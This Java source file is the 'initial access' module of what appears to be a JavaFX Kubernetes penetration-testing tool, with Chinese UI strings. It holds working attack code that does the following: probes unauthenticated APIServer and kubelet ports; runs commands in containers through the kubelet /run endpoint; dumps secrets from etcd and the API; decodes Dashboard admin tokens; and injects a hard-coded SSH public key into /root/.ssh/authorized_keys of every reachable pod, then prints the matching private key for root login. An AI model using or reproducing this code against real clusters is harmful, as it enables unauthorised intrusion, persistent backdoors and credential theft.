package com.k8spen.tool.controller;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.k8spen.tool.utils.K8sHttpUtil;
import com.k8spen.tool.utils.K8sJsonRenderer;
import javafx.concurrent.Task;
import javafx.scene.control.*;
import javafx.stage.FileChooser;

import java.io.File;
import java.nio.file.Files;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 1.初始访问 — APIServer / Kubelet / Etcd / Dashboard / Kubeconfig
 */
public class AccessHandler {

    private final ControllerContext ctx;

    // APIServer
    private String apiBaseUrl = null;
    private final TextField customApiPath;
    private final ComboBox<String> apiMethodOpt;
    private final TextArea kubectlCmdHint;
    private final TextArea apiServerOutput;

    // Kubelet
    private final TextField kubeletNs, kubeletPod, kubeletContainer, kubeletCmd;
    private final TextArea kubeletOutput;

    // Etcd
    private final ComboBox<String> etcdVersionOpt;
    private final TextField etcdPort, etcdKeyInput;
    private final TextArea etcdCmdHint, etcdOutput;

    // Dashboard
    private final TextField dashboardPort;
    private final CheckBox dashboardHttps;
    private final TextArea dashboardOutput;

    // Kubeconfig
    private final TextArea kubeconfigContent, kubeconfigOutput;

    // 共享
    private final TabPane mainTabPane;
    private final String defaultSshPubKey, defaultSshPrivKey;

    public AccessHandler(ControllerContext ctx,
                         TextField customApiPath, ComboBox<String> apiMethodOpt,
                         TextArea kubectlCmdHint, TextArea apiServerOutput,
                         TextField kubeletNs, TextField kubeletPod,
                         TextField kubeletContainer, TextField kubeletCmd,
                         TextArea kubeletOutput,
                         ComboBox<String> etcdVersionOpt, TextField etcdPort,
                         TextField etcdKeyInput, TextArea etcdCmdHint, TextArea etcdOutput,
                         TextField dashboardPort, CheckBox dashboardHttps, TextArea dashboardOutput,
                         TextArea kubeconfigContent, TextArea kubeconfigOutput,
                         TabPane mainTabPane,
                         String defaultSshPubKey, String defaultSshPrivKey) {
        this.ctx = ctx;
        this.customApiPath = customApiPath; this.apiMethodOpt = apiMethodOpt;
        this.kubectlCmdHint = kubectlCmdHint; this.apiServerOutput = apiServerOutput;
        this.kubeletNs = kubeletNs; this.kubeletPod = kubeletPod;
        this.kubeletContainer = kubeletContainer; this.kubeletCmd = kubeletCmd;
        this.kubeletOutput = kubeletOutput;
        this.etcdVersionOpt = etcdVersionOpt; this.etcdPort = etcdPort;
        this.etcdKeyInput = etcdKeyInput; this.etcdCmdHint = etcdCmdHint; this.etcdOutput = etcdOutput;
        this.dashboardPort = dashboardPort; this.dashboardHttps = dashboardHttps;
        this.dashboardOutput = dashboardOutput;
        this.kubeconfigContent = kubeconfigContent; this.kubeconfigOutput = kubeconfigOutput;
        this.mainTabPane = mainTabPane;
        this.defaultSshPubKey = defaultSshPubKey; this.defaultSshPrivKey = defaultSshPrivKey;
    }

    public String getApiBaseUrl() { return apiBaseUrl; }

    // ================ APIServer ================

    public void checkInsecurePort() {
        String host = ctx.getHost(); if (host == null) return;
        apiBaseUrl = "http://" + host + ":8080";
        ctx.log("[*] 已切换到非安全端口: " + apiBaseUrl);
        String url = apiBaseUrl + "/";
        String hint = "# 当前使用: " + apiBaseUrl + "\n"
                + "# 等效kubectl命令:\n"
                + "kubectl -s http://" + host + ":8080 get nodes\n"
                + "kubectl -s http://" + host + ":8080 get pods --all-namespaces\n"
                + "kubectl -s http://" + host + ":8080 get secrets --all-namespaces";
        ctx.asyncGet(url, apiServerOutput, hint, kubectlCmdHint);
    }

    public void checkSecurePort() {
        String host = ctx.getHost(); if (host == null) return;
        apiBaseUrl = "https://" + host + ":6443";
        ctx.log("[*] 已切换到安全端口: " + apiBaseUrl);
        String url = apiBaseUrl + "/";
        String hint = "# 当前使用: " + apiBaseUrl + "\n"
                + "# 等效kubectl命令:\n"
                + "kubectl -s https://" + host + ":6443 --insecure-skip-tls-verify=true get nodes\n"
                + "# 如果返回API列表而非403，说明存在匿名访问未授权";
        ctx.asyncGet(url, apiServerOutput, hint, kubectlCmdHint);
    }

    public void getNodes() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.asyncGet(buildApiUrl(host, "/api/v1/nodes"), apiServerOutput,
                "# 等效命令:\nkubectl get nodes -o json", kubectlCmdHint);
    }

    public void getPods() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.asyncGet(buildApiUrl(host, "/api/v1/pods"), apiServerOutput,
                "# 等效命令:\nkubectl get pods --all-namespaces -o json", kubectlCmdHint);
    }

    public void getSecrets() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.asyncGet(buildApiUrl(host, "/api/v1/namespaces/default/secrets"), apiServerOutput,
                "# 等效命令:\nkubectl get secrets -n default -o json\n\n# 获取token后可以base64解码使用:\necho '<token_base64>' | base64 -d",
                kubectlCmdHint);
    }

    public void checkAuth() {
        String host = ctx.getHost(); if (host == null) return;
        String url = buildApiUrl(host, "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews");
        String body = "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\","
                + "\"spec\":{\"namespace\":\"default\"}}";
        if (kubectlCmdHint != null) kubectlCmdHint.setText("# 等效命令:\nkubectl auth can-i --list");
        ctx.asyncPost(url, body, "application/json", apiServerOutput);
    }

    public void sendCustomApi() {
        String host = ctx.getHost(); if (host == null) return;
        String path = customApiPath.getText().trim();
        if (path.isEmpty()) { apiServerOutput.setText("[-] 请输入API路径"); return; }
        if (!path.startsWith("/")) path = "/" + path;
        String url = buildApiUrl(host, path);
        String method = apiMethodOpt.getValue();

        if ("GET".equals(method) || "DELETE".equals(method)) {
            ctx.setStatus("正在请求: " + url);
            apiServerOutput.setText("请求中...\n");
            ctx.log("[*] " + method + " " + url);
            String finalUrl = url;
            Task<String> task = new Task<>() {
                @Override protected String call() throws Exception {
                    return K8sHttpUtil.sendRequest(finalUrl, method, ctx.getToken(), ctx.getTimeout());
                }
            };
            task.setOnSucceeded(e -> {
                apiServerOutput.setText(K8sJsonRenderer.render(task.getValue()));
                ctx.setStatus("请求完成");
            });
            task.setOnFailed(e -> apiServerOutput.setText("[-] 请求失败: " + task.getException().getMessage()));
            new Thread(task).start();
        } else {
            ctx.asyncPost(url, "{}", "application/json", apiServerOutput);
        }
    }

    private String buildApiUrl(String host, String path) {
        if (apiBaseUrl != null && !apiBaseUrl.isEmpty()) return apiBaseUrl + path;
        return "https://" + host + ":6443" + path;
    }

    // ================ Kubelet ================

    public void checkKubelet() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.log("[*] 检测kubelet未授权: https://" + host + ":10250/pods");
        ctx.asyncGet("https://" + host + ":10250/pods", kubeletOutput);
    }

    public void kubeletListPods() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.log("[*] 列出kubelet管理的pods");
        ctx.asyncGet("https://" + host + ":10250/pods", kubeletOutput);
    }

    public void kubeletExecCmd() {
        String host = ctx.getHost(); if (host == null) return;
        String ns = kubeletNs.getText().trim();
        String pod = kubeletPod.getText().trim();
        String container = kubeletContainer.getText().trim();
        String cmd = kubeletCmd.getText().trim();
        if (pod.isEmpty() || container.isEmpty() || cmd.isEmpty()) {
            kubeletOutput.setText("[-] 请填写Pod名称、容器名和执行命令"); return;
        }
        String url = "https://" + host + ":10250/run/" + ns + "/" + pod + "/" + container;
        ctx.log("[*] kubelet执行命令: " + cmd + " on " + ns + "/" + pod + "/" + container);
        ctx.asyncPost(url, "cmd=" + cmd, "application/x-www-form-urlencoded", kubeletOutput);
    }

    public void kubeletInjectSSHKey() {
        String host = ctx.getHost(); if (host == null) return;
        kubeletOutput.setText("[*] 正在扫描所有Pod，查找开放22端口的容器...\n\n");
        ctx.log("[*] 扫描Pod SSH端口并注入密钥");

        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder result = new StringBuilder();
                String contentType = "application/x-www-form-urlencoded";
                String podsJson = K8sHttpUtil.sendRequest("https://" + host + ":10250/pods", "GET", null, ctx.getTimeout());
                if (podsJson.contains("401") || podsJson.contains("403"))
                    return "[-] kubelet未授权访问失败，请先检测10250端口";
                String json = podsJson;
                int nl = podsJson.indexOf('\n');
                if (nl > 0 && podsJson.startsWith("[HTTP")) json = podsJson.substring(nl + 1).trim();
                JsonObject root = JsonParser.parseString(json).getAsJsonObject();
                JsonArray items = root.has("items") ? root.getAsJsonArray("items") : new JsonArray();
                result.append(String.format("[*] 共发现 %d 个Pod，逐个检测22端口...\n\n", items.size()));
                int injected = 0;
                for (int i = 0; i < items.size(); i++) {
                    JsonObject pod = items.get(i).getAsJsonObject();
                    JsonObject meta = pod.has("metadata") ? pod.getAsJsonObject("metadata") : new JsonObject();
                    JsonObject spec = pod.has("spec") ? pod.getAsJsonObject("spec") : new JsonObject();
                    JsonObject status = pod.has("status") ? pod.getAsJsonObject("status") : new JsonObject();
                    String podName = meta.has("name") ? meta.get("name").getAsString() : "";
                    String ns = meta.has("namespace") ? meta.get("namespace").getAsString() : "";
                    String podIp = status.has("podIP") ? status.get("podIP").getAsString() : "";
                    JsonArray containers = spec.has("containers") ? spec.getAsJsonArray("containers") : new JsonArray();
                    if (containers.size() == 0) continue;
                    String containerName = containers.get(0).getAsJsonObject().get("name").getAsString();
                    String baseUrl = "https://" + host + ":10250/run/" + ns + "/" + podName + "/" + containerName;
                    String checkResult = K8sHttpUtil.sendPost(baseUrl, "cmd=cat /etc/ssh/sshd_config 2>/dev/null && echo SSH_FOUND || echo SSH_NOT_FOUND", contentType, null, ctx.getTimeout());
                    if (!checkResult.contains("SSH_FOUND")) {
                        result.append(String.format("  [%d] %s/%s (%s) - 无SSH服务，跳过\n", i + 1, ns, podName, podIp));
                        continue;
                    }
                    result.append(String.format("  [%d] %s/%s (%s) - 发现SSH服务!\n", i + 1, ns, podName, podIp));
                    String writeCmd = "cmd=mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '" + defaultSshPubKey + "' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo PUBKEY_OK";
                    String writeResult = K8sHttpUtil.sendPost(baseUrl, writeCmd, contentType, null, ctx.getTimeout());
                    if (writeResult.contains("PUBKEY_OK")) {
                        result.append("    [+] 公钥写入成功: /root/.ssh/authorized_keys\n");
                        K8sHttpUtil.sendPost(baseUrl, "cmd=/usr/sbin/sshd 2>/dev/null; echo done", contentType, null, ctx.getTimeout());
                        result.append("    [+] 已尝试启动sshd\n");
                        result.append("    [+] SSH连接: ssh -i id_rsa root@").append(podIp).append("\n");
                        injected++;
                    } else {
                        result.append("    [-] 写入失败: ").append(writeResult.replaceAll("\\[HTTP \\d+\\]", "").trim()).append("\n");
                    }
                    result.append("\n");
                }
                result.append("=".repeat(60)).append("\n");
                result.append(String.format("✅ 完成! 共成功注入 %d 个容器\n\n", injected));
                if (injected > 0) {
                    result.append("【连接方式】\n  1. 保存下方私钥到本地文件 id_rsa\n  2. chmod 600 id_rsa\n  3. ssh -i id_rsa root@<容器IP>\n\n");
                    result.append("【私钥内容】(复制保存为 id_rsa)\n").append(defaultSshPrivKey).append("\n");
                } else {
                    result.append("[-] 未找到开放SSH服务的容器\n");
                }
                return result.toString();
            }
        };
        task.setOnSucceeded(e -> { kubeletOutput.setText(task.getValue()); ctx.setStatus("SSH密钥注入完成"); ctx.log("[+] SSH密钥注入完成"); });
        task.setOnFailed(e -> { kubeletOutput.setText("[-] SSH密钥注入失败: " + task.getException().getMessage()); ctx.log("[-] SSH密钥注入失败"); });
        new Thread(task).start();
    }

    // ================ Etcd ================

    private String getEtcdPort() {
        String p = etcdPort != null ? etcdPort.getText().trim() : "";
        return p.isEmpty() ? "2379" : p;
    }

    public void checkEtcd() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            String url = "http://" + host + ":" + ep + "/v2/keys/";
            ctx.asyncGet(url, etcdOutput, "# etcd v2 等效命令:\ncurl http://" + host + ":" + ep + "/v2/keys/?recursive=true\n\n# 查看版本:\ncurl http://" + host + ":" + ep + "/version", etcdCmdHint);
        } else {
            String url = "http://" + host + ":" + ep + "/v3/kv/range";
            if (etcdCmdHint != null) etcdCmdHint.setText("# etcd v3 等效命令:\netcdctl --endpoints=http://" + host + ":" + ep + " get / --prefix --keys-only\n\n# 搜索secrets:\netcdctl --endpoints=http://" + host + ":" + ep + " get / --prefix --keys-only | grep secrets");
            ctx.asyncPost(url, "{\"key\":\"AA==\",\"range_end\":\"AA==\",\"limit\":\"10\"}", "application/json", etcdOutput);
        }
    }

    public void etcdGetKeys() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys/?recursive=true", etcdOutput);
        } else {
            String keyBase64 = Base64.getEncoder().encodeToString("/".getBytes());
            String rangeEndBase64 = Base64.getEncoder().encodeToString("0".getBytes());
            if (etcdCmdHint != null) etcdCmdHint.setText("# 等效命令:\netcdctl --endpoints=http://" + host + ":" + ep + " get / --prefix --keys-only");
            ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + keyBase64 + "\",\"range_end\":\"" + rangeEndBase64 + "\",\"keys_only\":true}", "application/json", etcdOutput);
        }
    }

    public void etcdSearchSecrets() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys/registry/secrets/?recursive=true", etcdOutput);
        } else {
            String key = "/registry/secrets/"; String rangeEnd = "/registry/secrets0";
            if (etcdCmdHint != null) etcdCmdHint.setText("# 等效命令:\netcdctl --endpoints=http://" + host + ":" + ep + " get /registry/secrets/ --prefix");
            ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + Base64.getEncoder().encodeToString(key.getBytes()) + "\",\"range_end\":\"" + Base64.getEncoder().encodeToString(rangeEnd.getBytes()) + "\"}", "application/json", etcdOutput);
        }
    }

    public void etcdReadKey() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String key = etcdKeyInput.getText().trim();
        if (key.isEmpty()) { etcdOutput.setText("[-] 请输入要读取的Key"); return; }
        String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys" + (key.startsWith("/") ? key : "/" + key), etcdOutput);
        } else {
            ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + Base64.getEncoder().encodeToString(key.getBytes()) + "\"}", "application/json", etcdOutput);
        }
    }

    // ================ Dashboard ================

    public void checkDashboard() {
        String host = ctx.getHost(); if (host == null) return;
        String port = dashboardPort.getText().trim();
        boolean https = dashboardHttps.isSelected();
        String scheme = https ? "https" : "http";
        dashboardOutput.setText("[*] 正在检测Dashboard...\n\n");
        ctx.log("[*] 检测Dashboard: " + host + ":" + port);

        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder sb = new StringBuilder();
                String baseUrl = scheme + "://" + host + ":" + port;
                boolean open = K8sHttpUtil.isPortOpen(host, Integer.parseInt(port), 3);
                sb.append("[1] 端口检测: ").append(host).append(":").append(port).append(open ? " [OPEN]\n" : " [CLOSED]\n");
                if (!open) { sb.append("[-] 端口未开放，Dashboard未部署或端口不对\n"); return sb.toString(); }
                sb.append("\n[2] Dashboard特征检测:\n");
                String indexResult = "";
                try {
                    indexResult = K8sHttpUtil.sendRequest(baseUrl + "/", "GET", null, 5);
                    if (indexResult.contains("dashboard") || indexResult.contains("kubernetes-dashboard") || indexResult.contains("ng-app"))
                        sb.append("  [+] 确认为K8s Dashboard!\n");
                    else if (indexResult.contains("200")) sb.append("  [?] 端口有响应，可能是Dashboard\n");
                    else sb.append("  [-] 响应内容未识别到Dashboard特征\n");
                } catch (Exception e) { sb.append("  [-] 请求失败: ").append(e.getMessage()).append("\n"); }
                sb.append("\n[3] 未授权访问检测:\n");
                try {
                    String apiCheck = K8sHttpUtil.sendRequest(baseUrl + "/api/v1/namespaces", "GET", null, 5);
                    if (apiCheck.contains("200") && apiCheck.contains("items")) sb.append("  ⚠️ 可未授权访问API，Dashboard存在未授权访问风险!\n");
                    else if (apiCheck.contains("403") || apiCheck.contains("401")) sb.append("  [*] API需要认证，检查是否可跳过登录...\n");
                } catch (Exception e) { sb.append("  [*] 无法直接访问API\n"); }
                try {
                    String csrfCheck = K8sHttpUtil.sendRequest(baseUrl + "/api/v1/csrftoken/login", "GET", null, 5);
                    if (csrfCheck.contains("200") && csrfCheck.contains("token")) sb.append("  ⚠️ 登录接口可访问，可能支持跳过登录!\n");
                } catch (Exception e) { /* ignore */ }
                sb.append("\n[4] 版本信息:\n");
                try {
                    String sysInfo = K8sHttpUtil.sendRequest(baseUrl + "/api/v1/systembanner", "GET", null, 5);
                    if (sysInfo.contains("200")) sb.append("  ").append(sysInfo.replaceAll("\\[HTTP \\d+\\]\\n?", "").trim()).append("\n");
                } catch (Exception e) { /* ignore */ }
                if (indexResult.contains("v2.")) {
                    int vi = indexResult.indexOf("v2.");
                    sb.append("  Dashboard版本: ").append(indexResult.substring(vi, Math.min(vi + 10, indexResult.length())).split("[^v0-9.]")[0]).append("\n");
                } else sb.append("  未检测到版本信息\n");
                sb.append("\n[5] 获取Dashboard Admin Token:\n");
                if (apiBaseUrl != null) {
                    try {
                        String secretsJson = K8sHttpUtil.sendRequest(apiBaseUrl + "/api/v1/namespaces/kubernetes-dashboard/secrets", "GET", ctx.getToken(), ctx.getTimeout());
                        if (secretsJson.contains("200") && secretsJson.contains("token")) {
                            String j = secretsJson.substring(secretsJson.indexOf('\n') + 1).trim();
                            JsonObject r = JsonParser.parseString(j).getAsJsonObject();
                            JsonArray items = r.has("items") ? r.getAsJsonArray("items") : new JsonArray();
                            for (int i = 0; i < items.size(); i++) {
                                JsonObject secret = items.get(i).getAsJsonObject();
                                String name = secret.has("metadata") ? secret.getAsJsonObject("metadata").get("name").getAsString() : "";
                                String type = secret.has("type") ? secret.get("type").getAsString() : "";
                                if (type.contains("service-account-token") && (name.contains("admin") || name.contains("dashboard"))) {
                                    JsonObject data = secret.has("data") ? secret.getAsJsonObject("data") : new JsonObject();
                                    if (data.has("token")) {
                                        String decoded = new String(Base64.getDecoder().decode(data.get("token").getAsString()));
                                        sb.append("  🔑 找到Token (").append(name).append("):\n  ").append(decoded).append("\n\n  → 可用此Token登录Dashboard获得cluster-admin权限\n");
                                    }
                                }
                            }
                        } else sb.append("  [-] 无法通过APIServer获取Secrets\n");
                    } catch (Exception e) { sb.append("  [-] 获取失败: ").append(e.getMessage()).append("\n"); }
                } else sb.append("  [-] 请先在APIServer未授权tab检测端口\n");
                sb.append("\n").append("=".repeat(60)).append("\n\u3010\u5229\u7528\u65b9\u5f0f\u3011\n  1. \u6d4f\u89c8\u5668\u8bbf\u95ee: ").append(baseUrl).append("\n  2. \u5982\u679c\u53ef\u8df3\u8fc7\u767b\u5f55 -> \u76f4\u63a5\u70b9\u201c\u8df3\u8fc7\u201d\u8fdb\u5165\n  3. \u5982\u679c\u9700\u8981Token -> \u7528\u4e0a\u65b9\u83b7\u53d6\u7684Token\u767b\u5f55\n  4. \u767b\u5f55\u540e\u53ef\u67e5\u770b\u6240\u6709Namespace\u8d44\u6e90\u3001\u6267\u884c\u5bb9\u5668\u547d\u4ee4\u3001\u67e5\u770bSecrets\n");
                return sb.toString();
            }
        };
        task.setOnSucceeded(e -> { dashboardOutput.setText(task.getValue()); ctx.setStatus("Dashboard检测完成"); ctx.log("[+] Dashboard检测完成"); });
        task.setOnFailed(e -> { dashboardOutput.setText("[-] 检测失败: " + task.getException().getMessage()); ctx.setStatus("检测失败"); });
        new Thread(task).start();
    }

    public void checkDashboardHttps() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.setStatus("扫描Dashboard常见端口...");
        dashboardOutput.setText("[*] 扫描常见Dashboard端口...\n\n");
        Task<String> task = new Task<>() {
            @Override protected String call() {
                StringBuilder sb = new StringBuilder();
                int[] ports = {443, 8443, 8001, 9090, 30000, 30443, 31000, 32000};
                int found = 0;
                for (int port : ports) {
                    boolean open = K8sHttpUtil.isPortOpen(host, port, 2);
                    if (open) {
                        sb.append(String.format("  ✅ %-8d [OPEN]", port)); found++;
                        try { String r = K8sHttpUtil.sendRequest("https://" + host + ":" + port + "/", "GET", null, 3);
                            if (r.contains("dashboard") || r.contains("kubernetes")) sb.append(" <- 发现Dashboard!");
                        } catch (Exception e) {
                            try { String r = K8sHttpUtil.sendRequest("http://" + host + ":" + port + "/", "GET", null, 3);
                                if (r.contains("dashboard") || r.contains("kubernetes")) sb.append(" <- 发现Dashboard! (HTTP)");
                            } catch (Exception ex) { /* ignore */ }
                        }
                        sb.append("\n");
                    } else sb.append(String.format("  ❌ %-8d [CLOSED]\n", port));
                }
                sb.append(String.format("\n扫描完成: %d/%d 端口开放\n", found, ports.length));
                if (found > 0) sb.append("\u63d0\u793a: \u5c06\u5f00\u653e\u7684\u7aef\u53e3\u586b\u5165\u4e0a\u65b9\u7aef\u53e3\u6846\uff0c\u70b9\u201c\u68c0\u6d4bDashboard\u201d\u8fdb\u884c\u8be6\u7ec6\u68c0\u6d4b");
                return sb.toString();
            }
        };
        task.setOnSucceeded(e -> { dashboardOutput.setText(task.getValue()); ctx.setStatus("端口扫描完成"); });
        task.setOnFailed(e -> dashboardOutput.setText("[-] 扫描失败: " + task.getException().getMessage()));
        new Thread(task).start();
    }

    public void openDashboardInBrowser() {
        String host = ctx.getHost(); if (host == null) return;
        String port = dashboardPort.getText().trim();
        boolean https = dashboardHttps.isSelected();
        String url = (https ? "https" : "http") + "://" + host + ":" + port + "/";
        try { java.awt.Desktop.getDesktop().browse(new java.net.URI(url)); ctx.log("[+] 已在浏览器中打开: " + url);
        } catch (Exception e) { ctx.log("[-] 打开浏览器失败: " + e.getMessage()); dashboardOutput.setText("[-] 打开浏览器失败: " + e.getMessage() + "\n请手动访问: " + url); }
    }

    // ================ Kubeconfig ================

    public void loadKubeconfig() {
        FileChooser fc = new FileChooser();
        fc.setTitle("选择Kubeconfig文件");
        fc.getExtensionFilters().addAll(new FileChooser.ExtensionFilter("所有文件", "*.*"), new FileChooser.ExtensionFilter("YAML文件", "*.yaml", "*.yml"), new FileChooser.ExtensionFilter("Config文件", "config", "*.conf"));
        File file = fc.showOpenDialog(mainTabPane.getScene().getWindow());
        if (file != null) {
            try { kubeconfigContent.setText(new String(Files.readAllBytes(file.toPath()), "UTF-8")); ctx.log("[+] 已加载Kubeconfig文件: " + file.getAbsolutePath());
            } catch (Exception e) { ctx.log("[-] 读取文件失败: " + e.getMessage()); }
        }
    }

    public void parseKubeconfig() {
        String content = kubeconfigContent.getText().trim();
        if (content.isEmpty()) { kubeconfigOutput.setText("[-] 请先加载或粘贴Kubeconfig内容"); return; }
        StringBuilder sb = new StringBuilder("# ======== Kubeconfig解析结果 ========\n\n");
        Pattern sp = Pattern.compile("server:\\s*(\\S+)");
        Matcher sm = sp.matcher(content);
        while (sm.find()) sb.append("[*] API Server: ").append(sm.group(1)).append("\n");
        Pattern up = Pattern.compile("name:\\s*(\\S+)");
        Matcher um = up.matcher(content);
        while (um.find()) sb.append("[*] Name: ").append(um.group(1)).append("\n");
        if (content.contains("client-certificate-data:")) sb.append("\n[+] 发现客户端证书数据 (client-certificate-data)\n");
        if (content.contains("client-key-data:")) sb.append("[+] 发现客户端密钥数据 (client-key-data)\n");
        if (content.contains("token:")) {
            sb.append("[+] 发现Token凭据\n");
            Pattern tp = Pattern.compile("token:\\s*(\\S+)");
            Matcher tm = tp.matcher(content);
            while (tm.find()) { String t = tm.group(1); sb.append("    Token: ").append(t.substring(0, Math.min(t.length(), 40))).append("...\n"); }
        }
        if (content.contains("certificate-authority-data:")) sb.append("[+] 发现CA证书数据\n");
        Pattern np = Pattern.compile("namespace:\\s*(\\S+)");
        Matcher nm = np.matcher(content);
        while (nm.find()) sb.append("[*] Namespace: ").append(nm.group(1)).append("\n");
        kubeconfigOutput.setText(sb.toString());
        ctx.log("[+] Kubeconfig解析完成");
    }

    public void genKubectlCmd() {
        String content = kubeconfigContent.getText().trim();
        if (content.isEmpty()) { kubeconfigOutput.setText("[-] 请先加载或粘贴Kubeconfig内容"); return; }
        StringBuilder sb = new StringBuilder("# ======== 生成的kubectl命令 ========\n\n");
        Pattern sp = Pattern.compile("server:\\s*(\\S+)");
        Matcher sm = sp.matcher(content);
        String server = sm.find() ? sm.group(1) : "";
        sb.append("# 方法一: 直接使用kubeconfig文件\nkubectl --kubeconfig=./config get nodes\nkubectl --kubeconfig=./config get pods --all-namespaces\nkubectl --kubeconfig=./config get secrets --all-namespaces\n\n");
        if (content.contains("token:")) {
            Pattern tp = Pattern.compile("token:\\s*(\\S+)");
            Matcher tm = tp.matcher(content);
            if (tm.find()) sb.append("# 方法二: 使用token直接访问\nkubectl --server=").append(server).append(" --token=").append(tm.group(1)).append(" --insecure-skip-tls-verify=true get nodes\n\n");
        }
        sb.append("# 方法三: 设置KUBECONFIG环境变量\nexport KUBECONFIG=./config\nkubectl get nodes\n\n");
        if (!server.isEmpty()) sb.append("# 当前server地址: ").append(server).append("\n");
        kubeconfigOutput.setText(sb.toString());
        ctx.log("[+] kubectl命令生成完成");
    }
}
